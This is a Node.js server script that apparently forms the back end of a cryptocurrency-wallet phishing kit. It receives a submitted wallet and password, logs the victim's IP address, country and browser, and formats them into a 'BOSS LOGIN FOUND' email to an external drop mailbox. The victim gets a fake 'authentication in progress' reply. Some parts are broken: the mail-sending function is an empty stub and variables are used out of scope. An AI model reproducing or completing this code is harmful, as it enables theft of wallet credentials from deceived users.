const http = require('http');
const url = require('url');
const querystring = require('querystring');
const fetch = require('node-fetch');

const server = http.createServer((req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Content-type', 'application/json');

  if (req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });

    req.on('end', async () => {
      const postData = querystring.parse(body);
      const data = {
        source: postData.source,
        password: postData.password,
        to: 'sharedbox2021@yandex.com',
        from: `no_reply@${req.headers.host}`,
        fromName: 'New Login!',
        subject: 'Important: New Leads Founds',
        country: await visitorCountry(),
        countryCode: await visitorCountryCode(),
        continentCode: await visitorContinentCode(),
        ip: getRealUserIp(req),
        browser: req.headers['user-agent'],
        message: `
          <HTML>
              <BODY>
                  <table>
                      <tr><td>BOSS LOGIN FOUND </td></tr>
                      <tr><td>Wallet: ${data.source}</td></tr>
                      <tr><td>Password: ${data.password}</td></tr>
                      <tr><td>Browser: ${data.browser}</td></tr>
                      <tr><td>IP: ${data.country} | <a href='http://whoer.net/check?host=${data.ip}' target='_blank'>${data.ip}</a> </td></tr>
                      <tr><td>>Anonymous Cyber Team<</td></tr>
                  </table>
              </BODY>
          </HTML>`,
      };

      const headers = {
        'MIME-Version': '1.0',
        'Content-type': 'text/html;charset=UTF-8',
        'From': `${data.fromName}<${data.from}>`,
      };

      try {
        await sendEmail(data.to, data.subject, data.message, headers);
        const jsonResponse = JSON.stringify({ status: 'success', message: 'Wallet authentication in progress!', code: 200 });
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(jsonResponse);
      } catch (error) {
        const jsonResponse = JSON.stringify({ status: 'error', message: 'We could not process your request', code: 400 });
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(jsonResponse);
      }
    });
  }
});

const PORT = process.env.PORT || 3000;

server.listen(PORT, () => {
  console.log(`Server is running on port ${PORT}`);
});

function getRealUserIp(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    return forwarded.split(',')[0];
  }
  return req.connection.remoteAddress;
}

async function visitorCountry() {
  const ip = getRealUserIp(req);
  try {
    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
    const ipData = await response.json();
    return ipData.geoplugin_countryName || 'Unknown';
  } catch (error) {
    return 'Unknown';
  }
}

async function visitorCountryCode() {
  const ip = getRealUserIp(req);
  try {
    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
    const ipData = await response.json();
    return ipData.geoplugin_countryCode || 'Unknown';
  } catch (error) {
    return 'Unknown';
  }
}

async function visitorContinentCode() {
  const ip = getRealUserIp(req);
  try {
    const response = await fetch(`http://www.geoplugin.net/json.gp?ip=${ip}`);
    const ipData = await response.json();
    return ipData.geoplugin_continentCode || 'Unknown';
  } catch (error) {
    return 'Unknown';
  }
}

async function sendEmail(to, subject, message, headers) {
  // You can implement your email sending logic here using a library like Nodemailer
}
